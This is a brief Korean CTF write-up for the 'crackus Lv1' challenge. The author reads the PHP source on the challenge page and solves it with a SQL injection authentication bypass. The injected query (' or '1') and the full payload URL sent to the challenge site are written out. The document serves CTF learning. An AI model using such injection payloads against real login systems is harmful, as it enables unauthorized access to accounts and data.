<img width="184" alt="스크린샷 2020-01-09 오후 4 51 47" src="https://user-images.githubusercontent.com/54495632/72054083-a7238080-330b-11ea-96d7-8bc7532c230e.png">

crackus Lv1. 

우유?

<img width="725" alt="스크린샷 2020-01-09 오후 4 52 04" src="https://user-images.githubusercontent.com/54495632/72054142-c3bfb880-330b-11ea-9d59-c777abdb5803.png">

클릭하니 php 소스코드를 보여준다.

딱히 필터링 조건도 별로 없고 아이디에도 admin 이여야 된다는 조건도 없어서 다음과 같은 쿼리문을

생각했다.

SELECT id FROM play_sql01 WHERE id= ' ' or '1' and pw=' ' or '1'

http://crackus.jeju.kr/chall01.php?id=&pw=%27%20or%20%271#

<img width="504" alt="스크린샷 2020-01-09 오후 6 07 34" src="https://user-images.githubusercontent.com/54495632/72054525-7c85f780-330c-11ea-8f8f-a89b7caa61d2.png">

<img width="735" alt="스크린샷 2020-01-09 오후 6 19 13" src="https://user-images.githubusercontent.com/54495632/72054562-90c9f480-330c-11ea-8848-77a2b28543c5.png">

해결 ^*^